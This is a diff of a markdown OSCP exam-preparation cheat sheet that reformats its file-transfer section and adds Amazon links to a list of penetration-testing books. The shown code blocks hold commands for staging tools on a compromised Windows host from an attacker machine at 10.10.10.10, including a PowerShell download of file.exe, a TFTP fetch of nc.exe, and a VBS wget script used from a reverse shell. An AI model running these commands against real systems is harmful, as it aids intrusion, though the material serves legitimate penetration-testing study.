@@ -101,7 +101,8 @@ During my time at the PWK labs and for my OSCP preparation, I gathered a big amo
 ## File Transfers
 
 ```
-**HTTP**
+HTTP
+
 # In Kali
 python -m SimpleHTTPServer 80
 
@@ -112,7 +113,9 @@ wget 10.10.10.10/file
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
 ```
 
-```FTP
+```
+FTP
+
 # In Kali
 python -m pyftpdlib -p 21 -w
 
@@ -130,7 +133,9 @@ ftp -v -n -s:ftp.txt
 “Name the filename as ‘file’ on your kali machine so that you don’t have to re-write the script multiple names, you can then rename the file on windows.”
 ```
 
-```TFTP
+```
+TFTP
+
 # In Kali
 atftpd --daemon --port 69 /tftp
 
@@ -138,7 +143,9 @@ atftpd --daemon --port 69 /tftp
 tftp -i 10.10.10.10 GET nc.exe
 ```
 
-```VBS
+```
+VBS
+
 If FTP/TFTP fails you, this wget script in VBS is the go to on Windows machines.
 
 # In reverse shell
@@ -213,8 +220,8 @@ Common priviledge escalation exploits and scripts: https://github.com/AusJock/Pr
 
 ## Books
 
-- RTFM - Red Team Field Manual
-- Penetration Testing - A Hands-On Introduction to Hacking
-- Metasploit The Penetration Tester’s Guide
+- [RTFM - Red Team Field Manual](https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/ref=sr_1_1?keywords=RTFM+-+Red+Team+Field+Manual&qid=1573218400&sr=8-1)
+- [Penetration Testing - A Hands-On Introduction to Hacking](https://www.amazon.com/Penetration-Testing-Hands-Introduction-Hacking/dp/1593275641/ref=sr_1_1?keywords=Penetration+Testing+-+A+Hands-On+Introduction+to+Hacking&qid=1573218418&sr=8-1)
+- [Metasploit The Penetration Tester’s Guide](https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X/ref=sr_1_1?keywords=Metasploit+The+Penetration+Tester%E2%80%99s+Guide&qid=1573218431&sr=8-1)
+- [Web Application Hacker's Handbook](https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470/ref=sr_1_1?keywords=Web+Application+Hacker%27s+Handbook&qid=1573218445&sr=8-1)
 - PWK Booklet and Videos
-- Web Application Hacker's Handbook
